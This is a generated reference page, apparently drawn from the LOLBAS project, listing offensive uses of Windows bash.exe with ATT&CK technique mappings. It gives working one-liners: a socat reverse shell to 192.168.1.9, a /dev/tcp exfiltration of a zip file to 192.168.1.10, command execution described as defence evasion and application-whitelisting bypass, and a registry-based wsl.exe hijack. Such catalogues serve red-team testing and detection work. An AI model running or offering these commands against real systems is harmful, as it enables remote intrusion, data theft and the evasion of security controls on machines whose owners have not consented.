---
parsed_by: focuslocust
source: commands
type: generated
---
# Bash Commands

[Home](../../../README.md)

> This page contains security testing commands. Use only in authorised environments.

## Bash.exe

Tool page: [Bash.exe](../../tools/windows/bash.exe.md)

### Performs execution of specified file, can be used as a defensive evasion.

```text
bash.exe -c "{CMD}"
```

Description:

Executes executable from bash.exe

Related ATT&CK:

- [T1202](../../attack/techniques/T1202-indirect-command-execution.md)

Provenance:

| Field | Value |
| --- | --- |
| Source | `lolbas` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/lolbas/yml/OSBinaries/Bash.yml` |
| Evidence | Command preserved from source parser. |

### Performs execution of specified file, can be used as a defensive evasion.

```text
bash.exe -c "socat tcp-connect:192.168.1.9:66 exec:sh,pty,stderr,setsid,sigint,sane"
```

Description:

Executes a reverse shell

Related ATT&CK:

- [T1202](../../attack/techniques/T1202-indirect-command-execution.md)

Provenance:

| Field | Value |
| --- | --- |
| Source | `lolbas` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/lolbas/yml/OSBinaries/Bash.yml` |
| Evidence | Command preserved from source parser. |

### Performs execution of specified file, can be used as a defensive evasion.

```text
bash.exe -c 'cat {PATH:.zip} > /dev/tcp/192.168.1.10/24'
```

Description:

Exfiltrate data

Related ATT&CK:

- [T1202](../../attack/techniques/T1202-indirect-command-execution.md)

Provenance:

| Field | Value |
| --- | --- |
| Source | `lolbas` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/lolbas/yml/OSBinaries/Bash.yml` |
| Evidence | Command preserved from source parser. |

### Performs execution of specified file, can be used to bypass Application Whitelisting.

```text
bash.exe -c "{CMD}"
```

Description:

Executes executable from bash.exe

Related ATT&CK:

- [T1202](../../attack/techniques/T1202-indirect-command-execution.md)

Provenance:

| Field | Value |
| --- | --- |
| Source | `lolbas` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/lolbas/yml/OSBinaries/Bash.yml` |
| Evidence | Command preserved from source parser. |

### Execute a payload as a child process of `bash.exe` while masquerading as WSL.

```text
bash.exe
```

Description:

When executed, `bash.exe` queries the registry value of `HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Lxss\MSI\InstallLocation`, which contains a folder path (`c:\program files\wsl` by default). If the value points to another folder containing a file named `wsl.exe`, it will be executed instead of the legitimate `wsl.exe` in the program files folder.

Related ATT&CK:

- [T1218](../../attack/techniques/T1218-system-binary-proxy-execution.md)

Provenance:

| Field | Value |
| --- | --- |
| Source | `lolbas` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/lolbas/yml/OSBinaries/Bash.yml` |
| Evidence | Command preserved from source parser. |
